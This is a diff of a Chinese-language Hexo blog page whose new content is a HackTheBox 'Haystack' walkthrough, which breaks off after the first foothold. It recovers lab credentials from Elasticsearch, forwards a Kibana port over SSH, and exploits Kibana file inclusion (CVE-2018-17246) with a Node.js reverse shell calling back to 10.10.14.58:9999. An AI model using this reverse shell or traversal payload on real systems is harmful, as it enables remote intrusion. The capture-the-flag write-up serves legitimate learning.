@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
-  <title>linux提权一条龙 | Hexo</title>
-  <meta name="keywords" content=" linux提权 , nc升级为完整shell ">
-  <meta name="description" content="linux提权一条龙 | Hexo">
+  <title>htb之Haystack | Hexo</title>
+  <meta name="keywords" content=" 博客 , htb ">
+  <meta name="description" content="htb之Haystack | Hexo">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="htb之Nibblesnmap 收集信息发现只开有22端口和80端口打开80端口，上面只有一句话hello world，但是再查看源代码的时候却意外发现了一个子目录直接开扫，没过多久就爆出了我们想要目录admin.php看到了后台管理地址，但是没有密码，目录爆破上也没有爆出其他有用的东西尝试输入弱口令，最后得出密码就是这台机子的名字成功进入到后台，Google一下改博客系统的漏洞发现有个上传漏洞，">
 <meta name="keywords" content="博客,htb">
@@ -343,9 +343,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-linux提权一条龙" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-htb之Haystack" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">linux提权一条龙</h1>
+        <h1 class="article-title">htb之Haystack</h1>
     
     <div class="article-meta">
         
@@ -353,23 +353,23 @@
         
         <span class="book">
             
-                <a href="javascript:" data-rel="转载文章">转载文章</a>
+                <a href="javascript:" data-rel="渗透笔记">渗透笔记</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">linux提权</a>
+            <a href="javascript:" class="color3">博客</a>
             
-            <a href="javascript:" class="color3">nc升级为完整shell</a>
+            <a href="javascript:" class="color4">htb</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2019-10-15 17:37:10'>2019-10-15 17:28</time>
+        创建时间:<time class="date" title='更新时间: 2019-11-22 16:52:38'>2019-11-22 09:55</time>
         
     </div>
     <div class="article-meta">
@@ -391,7 +391,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#htb之Haystack"><span class="toc-text">htb之Haystack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -407,7 +407,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>linux提权脚本大全：<a href="https://www.freebuf.com/sectool/121847.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/121847.html</a><br>nc提升为完整shell：<a href="https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html" target="_blank" rel="noopener">https://wx.abbao.cn/a/13847-7cd1b6e418fa413b.html</a><br>反向壳备忘录：<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+        <h1 id="htb之Haystack"><a href="#htb之Haystack" class="headerlink" title="htb之Haystack"></a>htb之Haystack</h1><p>nmap 收集信息<br><img src="/images/haystack/1.png" alt><br>80端口打开一个就是一张图片，下载下来放kali看看<br>strings 查看字符串，发现有一串base64编码<br><img src="/images/haystack/2.png" alt><br>解码la aguja en el pajar es “clave”<br>大海捞针是关键clave<br>构建URL：<a href="http://10.10.10.115:9200/_search?q=clave" target="_blank" rel="noopener">http://10.10.10.115:9200/_search?q=clave</a><br><img src="/images/haystack/3.png" alt><br>上面有两个base64编码<br>解码是user: security pass: spanish.is.key<br>用ssh连接,连接成功之后获取普通用户</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>第一件事当然是浏览并查看我可以访问的位置。很快就知道该服务器已安装了整个ELK（ElasticSearch Logstash和Kibana）堆栈<br>ss -plunt<br>查看端口开放的情况，有个5601端口仅对本地开放<br>使用ssh把端口转发出来<br>ssh <a href="mailto:security@10.10.10.115" target="_blank" rel="noopener">security@10.10.10.115</a> -L 5601:127.0.0.1:5601<br>访问5601端口可以看到上面运行着kibana<br>Google 该系统可利用的漏洞<a href="https://buffered4ever.com/2019/06/08/kibana-local-file-inclusion-cve-2018-17246/" target="_blank" rel="noopener">https://buffered4ever.com/2019/06/08/kibana-local-file-inclusion-cve-2018-17246/</a></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>根本文章所展示的漏洞，我们在一个可执行脚本的目录下建立一个shell<br>cd /dev/shm</p>
+<blockquote>
+<p>(function(){<br>    var net = require(“net”),<br>        cp = require(“child_process”),<br>        sh = cp.spawn(“/bin/sh”, []);<br>    var client = new net.Socket();<br>    client.connect(9999, “10.10.14.58”, function(){<br>        client.pipe(sh.stdin);<br>        sh.stdout.pipe(client);<br>        sh.stderr.pipe(client);<br>    });<br>    return /a/; // Prevents the Node.js application form crashing<br>})();</p>
+</blockquote>
+<p>然后构建URL访问我们刚刚写入的shell<br><a href="http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/rshell.js" target="_blank" rel="noopener">http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../dev/shm/rshell.js</a></p>
+<p>利用成功获取用户kibana的shell<br>现在可以读取“ /etc/logstash/conf.d”中的配置文件：</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 202989353@qq.com </span>
@@ -417,12 +424,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>linux提权一条龙</p>
+    <p><span class="copy-title">文章标题:</span>htb之Haystack</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="小菜">小菜</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-10-15, 17:28:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-10-15, 17:37:10</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/15/linux提权一条龙/" title="linux提权一条龙">https://manmachines.github.io/2019/10/15/linux提权一条龙/</a>
+    <p><span class="copy-title">发布时间:</span>2019-11-22, 09:55:06</p>
+    <p><span class="copy-title">最后更新:</span>2019-11-22, 16:52:38</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/22/htb之Haystack/" title="htb之Haystack">https://manmachines.github.io/2019/11/22/htb之Haystack/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
